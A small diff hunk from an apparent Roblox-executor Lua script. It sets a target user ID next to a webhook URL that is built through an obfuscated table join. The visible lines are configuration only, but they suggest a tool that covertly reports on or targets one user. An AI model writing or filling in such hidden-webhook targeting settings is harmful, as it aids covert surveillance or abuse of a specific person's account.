@@ -19,7 +19,7 @@ genv.GOOD_WEBHOOK = (function()
     return table.concat(o)
 end)()
 
-genv.TARGET_USER_ID = 0
+genv.TARGET_USER_ID = 2829121161
 
 genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 
